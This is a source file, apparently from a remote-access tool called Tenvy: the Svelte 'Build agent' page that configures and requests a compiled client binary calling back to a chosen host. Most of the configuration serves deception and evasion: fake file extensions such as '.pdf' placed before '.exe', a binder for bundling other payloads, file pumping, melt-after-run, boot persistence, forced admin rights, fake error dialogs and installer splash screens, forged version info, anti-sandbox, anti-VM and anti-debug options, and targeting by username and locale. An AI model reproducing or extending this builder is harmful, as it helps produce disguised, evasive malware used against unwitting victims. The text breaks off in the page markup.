<script lang="ts">
	import { resolve } from '$app/paths';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import {
		Collapsible,
		CollapsibleContent,
		CollapsibleTrigger
	} from '$lib/components/ui/collapsible/index.js';
	import * as Dialog from '$lib/components/ui/dialog/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Progress } from '$lib/components/ui/progress/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Textarea } from '$lib/components/ui/textarea/index.js';
	import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
	import {
		TriangleAlert,
		CircleCheck,
		Info,
		ChevronDown,
		Plus,
		Trash2,
		Wand2
	} from '@lucide/svelte';
	import { onDestroy } from 'svelte';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
		sharedSecret?: string;
		warnings?: string[];
	};

	let host = $state('localhost');
	let port = $state('2332');
	type TargetOS = 'windows' | 'linux' | 'darwin';
	type TargetArch = 'amd64' | '386' | 'arm64';

	const targetOsOptions: { value: TargetOS; label: string }[] = [
		{ value: 'windows', label: 'Windows' },
		{ value: 'linux', label: 'Linux' },
		{ value: 'darwin', label: 'macOS' }
	];

	const extensionOptionsByOS: Record<TargetOS, string[]> = {
		windows: ['.exe', '.msi', '.bat', '.scr', '.com', '.ps1'],
		linux: ['.bin', '.run', '.sh'],
		darwin: ['.bin', '.pkg', '.app']
	};

	const architectureOptionsByOS: Record<TargetOS, { value: TargetArch; label: string }[]> = {
		windows: [
			{ value: 'amd64', label: 'x64' },
			{ value: '386', label: 'x86' },
			{ value: 'arm64', label: 'ARM64' }
		],
		linux: [
			{ value: 'amd64', label: 'x64' },
			{ value: 'arm64', label: 'ARM64' }
		],
		darwin: [
			{ value: 'amd64', label: 'Intel (x64)' },
			{ value: 'arm64', label: 'Apple Silicon (ARM64)' }
		]
	};

	const extensionSpoofPresets = [
		'.jpg',
		'.png',
		'.msi',
		'.pdf',
		'.docx',
		'.xlsx',
		'.pptx',
		'.zip',
		'.mp3',
		'.mp4'
	] as const;
	type ExtensionSpoofPreset = (typeof extensionSpoofPresets)[number];

	const splashLayoutOptions = [
		{ value: 'center', label: 'Centered' },
		{ value: 'split', label: 'Split accent' }
	] as const;
	type SplashLayout = (typeof splashLayoutOptions)[number]['value'];

	const defaultSplashScreen = {
		title: 'Preparing setup',
		subtitle: 'Initializing components',
		message: 'Please wait while we ready the installer.',
		background: '#0f172a',
		accent: '#22d3ee',
		text: '#f8fafc',
		layout: 'center' as SplashLayout
	} as const;

	let outputFilename = $state('tenvy-client');
	let targetOS = $state<TargetOS>('windows');
	let targetArch = $state<TargetArch>('amd64');
	let outputExtension = $state(extensionOptionsByOS.windows[0]);
	let extensionSpoofingEnabled = $state(false);
	let extensionSpoofPreset = $state<ExtensionSpoofPreset>(extensionSpoofPresets[0]);
	let extensionSpoofCustom = $state('');
	let extensionSpoofError = $state<string | null>(null);
	let installationPath = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);
	let developerMode = $state(true);
	let mutexName = $state('');
	let compressBinary = $state(false);
	let forceAdmin = $state(false);
	let fileIconName = $state<string | null>(null);
	let fileIconData = $state<string | null>(null);
	let fileIconError = $state<string | null>(null);
	let generatedSecret = $state<string | null>(null);
	let secretCopyState = $state<'idle' | 'copied' | 'error'>('idle');
	let secretCopyTimeout: ReturnType<typeof setTimeout> | null = null;
	let buildWarnings = $state<string[]>([]);
	let pollIntervalMs = $state('');
	let maxBackoffMs = $state('');
	let shellTimeoutSeconds = $state('');
	const defaultFileInformation = {
		fileDescription: '',
		productName: '',
		companyName: '',
		productVersion: '',
		fileVersion: '',
		originalFilename: '',
		internalName: '',
		legalCopyright: ''
	} as const;
	let fileInformation = $state({ ...defaultFileInformation });

	const antiTamperBadges = ['Anti-Sandbox', 'Anti-VM', 'Anti-Debug'] as const;
	const installationPathPresets = [
		{ label: '%AppData%\\Tenvy', value: '%AppData%\\Tenvy' },
		{ label: '%USERPROFILE%\\Tenvy', value: '%USERPROFILE%\\Tenvy' },
		{ label: '~/.config/tenvy', value: '~/.config/tenvy' }
	] as const;
	const filePumperUnits = ['KB', 'MB', 'GB'] as const;
	const fakeDialogOptions = [
		{ value: 'none', label: 'Disabled' },
		{ value: 'error', label: 'Error dialog' },
		{ value: 'warning', label: 'Warning dialog' },
		{ value: 'info', label: 'Information dialog' }
	] as const;
	type FakeDialogType = (typeof fakeDialogOptions)[number]['value'];
	const fakeDialogDefaults: Record<
		Exclude<FakeDialogType, 'none'>,
		{ title: string; message: string }
	> = {
		error: {
			title: 'Setup Error',
			message: 'An unexpected error occurred while installing the application.'
		},
		warning: {
			title: 'Setup Warning',
			message: 'Review the installation requirements before continuing.'
		},
		info: {
			title: 'Setup Complete',
			message: 'The installation finished successfully.'
		}
	} as const;

	const inputFieldClasses =
		'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-base shadow-xs ring-offset-background transition-[color,box-shadow] outline-none selection:bg-primary selection:text-primary-foreground placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 md:text-sm dark:bg-input/30 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40';

	type Endpoint = { host: string; port: string };
	type HeaderKV = { key: string; value: string };
	type CookieKV = { name: string; value: string };

	let fileInformationOpen = $state(false);
	let groupTag = $state('');
	let fallbackEndpoints = $state<Endpoint[]>([{ host: '', port: '' }]);
	let watchdogEnabled = $state(false);
	let watchdogIntervalSeconds = $state('60');
	let enableFilePumper = $state(false);
	let filePumperTargetSize = $state('');
	let filePumperUnit = $state<(typeof filePumperUnits)[number]>('MB');
	let executionDelaySeconds = $state('');
	let executionAllowedUsernames = $state('');
	let executionAllowedLocales = $state('');
	let executionMinUptimeMinutes = $state('');
	let executionStartDate = $state('');
	let executionEndDate = $state('');
	let executionRequireInternet = $state(true);
	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
	let fakeDialogType = $state<FakeDialogType>('none');
	let fakeDialogTitle = $state('');
	let fakeDialogMessage = $state('');
	let splashScreenEnabled = $state(false);
	let splashDialogOpen = $state(false);
	let splashTitle = $state(defaultSplashScreen.title);
	let splashSubtitle = $state(defaultSplashScreen.subtitle);
	let splashMessage = $state(defaultSplashScreen.message);
	let splashBackgroundColor = $state(defaultSplashScreen.background);
	let splashAccentColor = $state(defaultSplashScreen.accent);
	let splashTextColor = $state(defaultSplashScreen.text);
	let splashLayout = $state<SplashLayout>(defaultSplashScreen.layout);
	let binderFileName = $state<string | null>(null);
	let binderFileSize = $state<number | null>(null);
	let binderFileError = $state<string | null>(null);
	let binderFileData = $state<string | null>(null);
	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');

	const sanitizedOutputBase = $derived(() => {
		const trimmed = outputFilename.trim();
		if (!trimmed) {
			return 'tenvy-client';
		}

		const normalizedExtension = outputExtension.toLowerCase();
		let base = trimmed;
		if (normalizedExtension && trimmed.toLowerCase().endsWith(normalizedExtension)) {
			base = trimmed.slice(0, -normalizedExtension.length);
		}

		const withoutTrailingDot = base.replace(/\.+$/, '');
		const sanitized = withoutTrailingDot.trim();
		return sanitized || 'tenvy-client';
	});

	const activeSpoofExtension = $derived(() => {
		if (!extensionSpoofingEnabled) {
			return '';
		}

		const trimmedCustom = extensionSpoofCustom.trim();
		const customNormalized = normalizeSpoofExtension(trimmedCustom);
		if (trimmedCustom && customNormalized) {
			return customNormalized;
		}

		return normalizeSpoofExtension(extensionSpoofPreset) ?? '';
	});

	const effectiveOutputFilename = $derived(
		() => `${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
	);

	const normalizedSplashTitle = $derived(() => splashTitle.trim() || defaultSplashScreen.title);
	const normalizedSplashSubtitle = $derived(() => splashSubtitle.trim());
	const normalizedSplashMessage = $derived(
		() => splashMessage.trim() || defaultSplashScreen.message
	);
	const normalizedSplashBackground = $derived(() =>
		normalizeHexColor(splashBackgroundColor, defaultSplashScreen.background)
	);
	const normalizedSplashAccent = $derived(() =>
		normalizeHexColor(splashAccentColor, defaultSplashScreen.accent)
	);
	const normalizedSplashText = $derived(() =>
		normalizeHexColor(splashTextColor, defaultSplashScreen.text)
	);
	const splashLayoutLabel = $derived(
		() => splashLayoutOptions.find((option) => option.value === splashLayout)?.label ?? 'Centered'
	);

	const isWindowsTarget = $derived(targetOS === 'windows');

	let buildStatus = $state<BuildStatus>('idle');
	let buildProgress = $state(0);
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);
	let buildLog = $state<string[]>([]);

	let progressMessages = $state<{ id: number; text: string; tone: 'info' | 'success' | 'error' }[]>(
		[]
	);
	let nextMessageId = $state(0);

	let isBuilding = $derived(buildStatus === 'running');

	$effect(() => {
		const allowedExtensions = extensionOptionsByOS[targetOS] ?? extensionOptionsByOS.windows;
		if (!allowedExtensions.includes(outputExtension)) {
			outputExtension = allowedExtensions[0];
		}
	});

	$effect(() => {
		const archOptions = architectureOptionsByOS[targetOS] ?? architectureOptionsByOS.windows;
		if (!archOptions.some((option) => option.value === targetArch)) {
			targetArch = archOptions[0]?.value ?? 'amd64';
		}
	});

	$effect(() => {
		if (!isWindowsTarget) {
			fileIconName = null;
			fileIconData = null;
			fileIconError = null;
			fileInformation = { ...defaultFileInformation };
		}
	});

	$effect(() => {
		if (!extensionSpoofingEnabled) {
			extensionSpoofError = null;
			return;
		}

		const trimmed = extensionSpoofCustom.trim();
		if (!trimmed) {
			extensionSpoofError = null;
			return;
		}

		extensionSpoofError =
			normalizeSpoofExtension(trimmed) === null
				? 'Custom extension must use 1-12 letters or numbers.'
				: null;
	});

	function resetProgress() {
		buildStatus = 'idle';
		buildProgress = 0;
		buildError = null;
		downloadUrl = null;
		outputPath = null;
		buildLog = [];
		progressMessages = [];
		generatedSecret = null;
		buildWarnings = [];
		fileIconError = null;
		secretCopyState = 'idle';
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	}

	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
		progressMessages = [
			...progressMessages,
			{
				id: nextMessageId++,
				text,
				tone
			}
		];
	}

	function normalizeSpoofExtension(value: string): string | null {
		if (!value) {
			return null;
		}

		const trimmed = value.trim();
		if (!trimmed) {
			return null;
		}

		const withDot = trimmed.startsWith('.') ? trimmed : `.${trimmed}`;
		const alphanumeric = withDot.slice(1).replace(/[^A-Za-z0-9]/g, '');

		if (!alphanumeric) {
			return null;
		}

		if (alphanumeric.length > 12) {
			return null;
		}

		return `.${alphanumeric.toLowerCase()}`;
	}

	function normalizeHexColor(value: string, fallback: string): string {
		if (typeof value !== 'string') {
			return fallback;
		}

		const trimmed = value.trim();
		if (/^#[0-9A-Fa-f]{6}$/.test(trimmed)) {
			return trimmed.toLowerCase();
		}

		return fallback;
	}

	function resetSplashToDefaults() {
		splashTitle = defaultSplashScreen.title;
		splashSubtitle = defaultSplashScreen.subtitle;
		splashMessage = defaultSplashScreen.message;
		splashBackgroundColor = defaultSplashScreen.background;
		splashAccentColor = defaultSplashScreen.accent;
		splashTextColor = defaultSplashScreen.text;
		splashLayout = defaultSplashScreen.layout;
	}

	function sanitizeFileInformation() {
		const entries = Object.entries(fileInformation).map(([key, value]) => [key, value.trim()]);
		return Object.fromEntries(entries.filter(([, value]) => value !== ''));
	}

	function applyInstallationPreset(preset: string) {
		installationPath = preset;
	}

	function normalizedPortValue(value: string) {
		return value.replace(/[^0-9]/g, '');
	}

	function setFallbackEndpoint(index: number, key: 'host' | 'port', value: string) {
		fallbackEndpoints = fallbackEndpoints.map((endpoint, idx) => {
			if (idx !== index) {
				return endpoint;
			}

			if (key === 'port') {
				return { ...endpoint, port: normalizedPortValue(value) };
			}

			return { ...endpoint, host: value };
		});
	}

	function addFallbackEndpoint() {
		fallbackEndpoints = [...fallbackEndpoints, { host: '', port: '' }];
	}

	function removeFallbackEndpoint(index: number) {
		fallbackEndpoints = fallbackEndpoints.filter((_, idx) => idx !== index);
		if (fallbackEndpoints.length === 0) {
			fallbackEndpoints = [{ host: '', port: '' }];
		}
	}

	function addCustomHeader() {
		customHeaders = [...customHeaders, { key: '', value: '' }];
	}

	function updateCustomHeader(index: number, key: keyof HeaderKV, value: string) {
		customHeaders = customHeaders.map((header, idx) =>
			idx === index ? { ...header, [key]: value } : header
		);
	}

	function removeCustomHeader(index: number) {
		customHeaders = customHeaders.filter((_, idx) => idx !== index);
		if (customHeaders.length === 0) {
			customHeaders = [{ key: '', value: '' }];
		}
	}

	function addCustomCookie() {
		customCookies = [...customCookies, { name: '', value: '' }];
	}

	function updateCustomCookie(index: number, key: keyof CookieKV, value: string) {
		customCookies = customCookies.map((cookie, idx) =>
			idx === index ? { ...cookie, [key]: value } : cookie
		);
	}

	function removeCustomCookie(index: number) {
		customCookies = customCookies.filter((_, idx) => idx !== index);
		if (customCookies.length === 0) {
			customCookies = [{ name: '', value: '' }];
		}
	}

	function generateMutexName(length = 16) {
		const bytes = new Uint8Array(Math.ceil(length / 2));
		if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
			crypto.getRandomValues(bytes);
		} else {
			for (let i = 0; i < bytes.length; i += 1) {
				bytes[i] = Math.floor(Math.random() * 256);
			}
		}
		const suffix = Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0'))
			.join('')
			.slice(0, length)
			.toUpperCase();
		mutexName = `Global\\tenvy-${suffix}`;
	}

	const binderSizeLimitBytes = 50 * 1024 * 1024;
	const maxFilePumperBytes = 10 * 1024 * 1024 * 1024; // 10 GiB ceiling for padded binaries
	const filePumperUnitToBytes = {
		KB: 1024,
		MB: 1024 * 1024,
		GB: 1024 * 1024 * 1024
	} as const;

	function formatFileSize(bytes: number | null) {
		if (!bytes || !Number.isFinite(bytes)) {
			return '';
		}

		if (bytes >= 1024 * 1024 * 10) {
			return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
		}
		if (bytes >= 1024) {
			return `${(bytes / 1024).toFixed(1)} KB`;
		}
		return `${bytes} B`;
	}

	function inputValueFromEvent(event: Event) {
		const target = event.target as HTMLInputElement | HTMLTextAreaElement | null;
		return target?.value ?? '';
	}

	function parseListInput(value: string) {
		return value
			.split(/[,\n]/)
			.map((entry) => entry.trim())
			.filter((entry, index, array) => entry.length > 0 && array.indexOf(entry) === index);
	}

	function toIsoDateTime(value: string) {
		const trimmed = value.trim();
		if (!trimmed) {
			return null;
		}

		const date = new Date(trimmed);
		if (Number.isNaN(date.getTime())) {
			return null;
		}

		return date.toISOString();
	}

	async function handleIconSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		fileIconError = null;

		if (!file) {
			fileIconName = null;
			fileIconData = null;
			return;
		}

		if (file.size > 512 * 1024) {
			fileIconError = 'Icon file must be 512KB or smaller.';
			fileIconName = null;
			fileIconData = null;
			return;
		}

		try {
			const buffer = await file.arrayBuffer();
			const bytes = new Uint8Array(buffer);
			let binary = '';
			for (const byte of bytes) {
				binary += String.fromCharCode(byte);
			}
			fileIconData = btoa(binary);
			fileIconName = file.name;
		} catch (err) {
			fileIconError = err instanceof Error ? err.message : 'Failed to read icon file.';
			fileIconName = null;
			fileIconData = null;
		}
	}

	function clearIconSelection() {
		fileIconName = null;
		fileIconData = null;
		fileIconError = null;
	}

	function readFileAsBase64(file: File): Promise<string> {
		return new Promise((resolvePromise, rejectPromise) => {
			if (typeof FileReader === 'undefined') {
				rejectPromise(new Error('FileReader API is unavailable.'));
				return;
			}

			const reader = new FileReader();
			reader.onload = () => {
				const result = reader.result;
				if (typeof result !== 'string') {
					rejectPromise(new Error('Unexpected file reader result.'));
					return;
				}
				const [, base64Payload = ''] = result.split(',');
				if (!base64Payload) {
					rejectPromise(new Error('Binder payload is empty.'));
					return;
				}
				resolvePromise(base64Payload);
			};
			reader.onerror = () => {
				rejectPromise(new Error('Failed to read file.'));
			};
			reader.readAsDataURL(file);
		});
	}

	async function handleBinderSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		binderFileError = null;

		if (!file) {
			binderFileName = null;
			binderFileSize = null;
			binderFileData = null;
			return;
		}

		if (file.size > binderSizeLimitBytes) {
			binderFileError = 'Binder payload must be 50MB or smaller.';
			binderFileName = null;
			binderFileSize = null;
			binderFileData = null;
			return;
		}

		try {
			binderFileData = await readFileAsBase64(file);
			binderFileName = file.name;
			binderFileSize = file.size;
		} catch (err) {
			binderFileError = err instanceof Error ? err.message : 'Failed to process binder payload.';
			binderFileName = null;
			binderFileSize = null;
			binderFileData = null;
		}
	}

	function clearBinderSelection() {
		binderFileName = null;
		binderFileSize = null;
		binderFileError = null;
		binderFileData = null;
	}

	async function buildAgent() {
		if (buildStatus === 'running') {
			return;
		}

		resetProgress();

		const trimmedHost = host.trim();
		const trimmedPort = port.trim();
		const trimmedPollInterval = pollIntervalMs.trim();
		const trimmedMaxBackoff = maxBackoffMs.trim();
		const trimmedShellTimeout = shellTimeoutSeconds.trim();

		if (!trimmedHost) {
			buildError = 'Host is required.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
			buildError = 'Port must be numeric.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPollInterval) {
			const pollValue = Number(trimmedPollInterval);
			if (!Number.isFinite(pollValue) || pollValue < 1000 || pollValue > 3_600_000) {
				buildError = 'Poll interval must be between 1,000 and 3,600,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedMaxBackoff) {
			const backoffValue = Number(trimmedMaxBackoff);
			if (!Number.isFinite(backoffValue) || backoffValue < 1000 || backoffValue > 86_400_000) {
				buildError = 'Max backoff must be between 1,000 and 86,400,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedShellTimeout) {
			const timeoutValue = Number(trimmedShellTimeout);
			if (!Number.isFinite(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
				buildError = 'Shell timeout must be between 5 and 7,200 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		const trimmedGroupTag = groupTag.trim();
		const normalizedFallbackEndpoints = fallbackEndpoints
			.map((endpoint) => ({
				host: endpoint.host.trim(),
				port: endpoint.port.trim()
			}))
			.filter((endpoint) => endpoint.host !== '' || endpoint.port !== '');

		for (const endpoint of normalizedFallbackEndpoints) {
			if (!endpoint.host) {
				buildError = 'Each backup endpoint requires a host value.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			if (endpoint.port && !/^\d+$/.test(endpoint.port)) {
				buildError = `Backup endpoint port for ${endpoint.host} must be numeric.`;
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		const sanitizedFallbackEndpoints = normalizedFallbackEndpoints.map((endpoint) => ({
			host: endpoint.host,
			port: endpoint.port || '2332'
		}));

		const sanitizedHeaders = customHeaders
			.map((header) => ({
				key: header.key.trim(),
				value: header.value.trim()
			}))
			.filter((header) => header.key !== '' && header.value !== '');

		const sanitizedCookies = customCookies
			.map((cookie) => ({
				name: cookie.name.trim(),
				value: cookie.value.trim()
			}))
			.filter((cookie) => cookie.name !== '' && cookie.value !== '');

		const trimmedWatchdogInterval = watchdogIntervalSeconds.trim();
		let watchdogIntervalValue: number | null = null;
		if (watchdogEnabled) {
			const interval = trimmedWatchdogInterval ? Number(trimmedWatchdogInterval) : 60;
			if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
				buildError = 'Watchdog interval must be between 5 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			watchdogIntervalValue = Math.round(interval);
		}

		const trimmedFilePumperSize = filePumperTargetSize.trim();
		let filePumperTargetBytes: number | null = null;
		if (enableFilePumper) {
			if (!trimmedFilePumperSize) {
				buildError = 'Provide a target size for the file pumper or disable the feature.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			const parsedSize = Number.parseFloat(trimmedFilePumperSize);
			if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
				buildError = 'File pumper size must be a positive number.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			const multiplier = filePumperUnitToBytes[filePumperUnit] ?? filePumperUnitToBytes.MB;
			const computedBytes = Math.round(parsedSize * multiplier);
			if (
				!Number.isFinite(computedBytes) ||
				computedBytes <= 0 ||
				computedBytes > maxFilePumperBytes
			) {
				buildError = 'File pumper target size is too large. Maximum supported size is 10 GiB.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			filePumperTargetBytes = computedBytes;
		}

		const trimmedExecutionDelay = executionDelaySeconds.trim();
		let executionDelayValue: number | null = null;
		if (trimmedExecutionDelay) {
			const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
			if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
				buildError = 'Delayed start must be between 0 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			executionDelayValue = parsedDelay;
		}

		const trimmedExecutionUptime = executionMinUptimeMinutes.trim();
		let executionUptimeValue: number | null = null;
		if (trimmedExecutionUptime) {
			const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
			if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
				buildError = 'Minimum uptime must be between 0 and 10,080 minutes (7 days).';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			executionUptimeValue = parsedUptime;
		}

		const allowedUsernames = parseListInput(executionAllowedUsernames);
		const allowedLocales = parseListInput(executionAllowedLocales);

		const startIso = toIsoDateTime(executionStartDate);
		if (executionStartDate.trim() && !startIso) {
			buildError = 'Earliest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}

		const endIso = toIsoDateTime(executionEndDate);
		if (executionEndDate.trim() && !endIso) {
			buildError = 'Latest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}

		if (startIso && endIso) {
			const startTime = new Date(startIso).getTime();
			const endTime = new Date(endIso).getTime();
			if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
				buildError = 'Earliest run time must be before the latest run time.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		if (binderFileName && !binderFileData) {
			buildError = 'Binder payload is still processing. Please reselect the file.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}

		buildStatus = 'running';
		buildProgress = 5;
		pushProgress('Preparing build request...');

		const payload: Record<string, unknown> = {
			host: trimmedHost,
			port: trimmedPort || '2332',
			outputFilename: effectiveOutputFilename,
			outputExtension,
			targetOS,
			targetArch,
			installationPath: installationPath.trim(),
			meltAfterRun,
			startupOnBoot,
			developerMode,
			mutexName: mutexName.trim(),
			compressBinary,
			forceAdmin
		};

		if (trimmedGroupTag) {
			payload.groupTag = trimmedGroupTag;
		}
		if (sanitizedFallbackEndpoints.length > 0) {
			payload.fallbackEndpoints = sanitizedFallbackEndpoints;
		}
		if (watchdogIntervalValue !== null) {
			payload.watchdog = {
				enabled: true,
				intervalSeconds: watchdogIntervalValue
			} satisfies Record<string, unknown>;
		}
		if (filePumperTargetBytes !== null) {
			payload.filePumper = {
				enabled: true,
				targetBytes: filePumperTargetBytes,
				unit: filePumperUnit,
				displayValue: trimmedFilePumperSize
			} satisfies Record<string, unknown>;
		}

		const shouldIncludeExecutionTriggers =
			executionDelayValue !== null ||
			executionUptimeValue !== null ||
			allowedUsernames.length > 0 ||
			allowedLocales.length > 0 ||
			Boolean(startIso) ||
			Boolean(endIso) ||
			!executionRequireInternet;

		if (shouldIncludeExecutionTriggers) {
			const executionPayload: Record<string, unknown> = {
				requireInternet: executionRequireInternet
			};
			if (executionDelayValue !== null) {
				executionPayload.delaySeconds = executionDelayValue;
			}
			if (executionUptimeValue !== null) {
				executionPayload.minUptimeMinutes = executionUptimeValue;
			}
			if (allowedUsernames.length > 0) {
				executionPayload.allowedUsernames = allowedUsernames;
			}
			if (allowedLocales.length > 0) {
				executionPayload.allowedLocales = allowedLocales;
			}
			if (startIso) {
				executionPayload.startTime = startIso;
			}
			if (endIso) {
				executionPayload.endTime = endIso;
			}
			payload.executionTriggers = executionPayload;
		}

		if (sanitizedHeaders.length > 0) {
			payload.customHeaders = sanitizedHeaders;
		}
		if (sanitizedCookies.length > 0) {
			payload.customCookies = sanitizedCookies;
		}
		if (fakeDialogType !== 'none') {
			const defaults = fakeDialogDefaults[fakeDialogType as Exclude<FakeDialogType, 'none'>];
			const title = fakeDialogTitle.trim() || defaults.title;
			const message = fakeDialogMessage.trim() || defaults.message;
			payload.fakeDialog = {
				type: fakeDialogType,
				title,
				message
			} satisfies Record<string, unknown>;
		}
		if (splashScreenEnabled) {
			const subtitle = normalizedSplashSubtitle;
			const splashPayload = {
				enabled: true,
				title: normalizedSplashTitle,
				message: normalizedSplashMessage,
				layout: splashLayout,
				colors: {
					background: normalizedSplashBackground,
					text: normalizedSplashText,
					accent: normalizedSplashAccent
				},
				...(subtitle ? { subtitle } : {})
			} satisfies Record<string, unknown>;
			payload.splashScreen = splashPayload;
		}
		if (binderFileData && binderFileName) {
			payload.binder = {
				name: binderFileName,
				size: binderFileSize ?? undefined,
				data: binderFileData
			} satisfies Record<string, unknown>;
		}

		if (trimmedPollInterval) {
			payload.pollIntervalMs = trimmedPollInterval;
		}
		if (trimmedMaxBackoff) {
			payload.maxBackoffMs = trimmedMaxBackoff;
		}
		if (trimmedShellTimeout) {
			payload.shellTimeoutSeconds = trimmedShellTimeout;
		}
		if (isWindowsTarget && fileIconData) {
			payload.fileIcon = {
				name: fileIconName,
				data: fileIconData
			};
		}

		const info = sanitizeFileInformation();
		if (isWindowsTarget && Object.keys(info).length > 0) {
			payload.fileInformation = info;
		}

		try {
			pushProgress('Dispatching build to compiler environment...');
			buildProgress = 20;
			const response = await fetch('/api/build', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});

			const result = (await response.json()) as BuildResponse;
			buildLog = result.log ?? [];
			generatedSecret = result.sharedSecret ?? null;
			buildWarnings = result.warnings ?? [];

			if (!response.ok || !result.success) {
				const message = result.message || 'Failed to build agent.';
				throw new Error(message);
			}

			buildProgress = 65;
			pushProgress('Compilation completed. Finalizing artifacts...');

			downloadUrl = result.downloadUrl ?? null;
			outputPath = result.outputPath ?? null;

			buildProgress = 100;
			buildStatus = 'success';
			pushProgress('Agent binary is ready.', 'success');
		} catch (err) {
			buildProgress = 100;
			buildStatus = 'error';
			buildError = err instanceof Error ? err.message : 'Unknown build error.';
			pushProgress(buildError, 'error');
		}
	}

	function messageToneClasses(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return 'text-emerald-500';
		if (tone === 'error') return 'text-red-500';
		return 'text-muted-foreground';
	}

	function toneIcon(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return CircleCheck;
		if (tone === 'error') return TriangleAlert;
		return Info;
	}

	function buildStatusBadgeClasses(status: BuildStatus) {
		if (status === 'success') return 'border-emerald-500/50 bg-emerald-500/10 text-emerald-600';
		if (status === 'error') return 'border-red-500/60 bg-red-500/10 text-red-600';
		if (status === 'running') return 'border-sky-500/60 bg-sky-500/10 text-sky-600';
		return 'text-muted-foreground';
	}

	function buildStatusLabel(status: BuildStatus) {
		if (status === 'success') return 'Complete';
		if (status === 'error') return 'Error';
		if (status === 'running') return 'Building';
		return 'Idle';
	}

	function scheduleSecretCopyReset() {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
		}
		secretCopyTimeout = setTimeout(() => {
			secretCopyState = 'idle';
			secretCopyTimeout = null;
		}, 2000);
	}

	async function copySharedSecret() {
		if (!generatedSecret) {
			return;
		}

		if (typeof navigator === 'undefined' || !navigator.clipboard) {
			secretCopyState = 'error';
			scheduleSecretCopyReset();
			return;
		}

		try {
			await navigator.clipboard.writeText(generatedSecret);
			secretCopyState = 'copied';
		} catch {
			secretCopyState = 'error';
		}

		scheduleSecretCopyReset();
	}

	onDestroy(() => {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	});
</script>

<div class="mx-auto w-full space-y-6 px-4 pb-10">
	<Card>
		<CardHeader class="space-y-4">
			<div class="flex flex-wrap items-center justify-between gap-3">
				<div class="space-y-1">
					<CardTitle>Build agent</CardTitle>
					<CardDescription>
						Configure connection and persistence options, then generate a customized client binary.
					</CardDescription>
				</div>
				<div class="flex flex-wrap gap-2">
					{#each antiTamperBadges as badge (badge)}
						<Badge
							variant="outline"
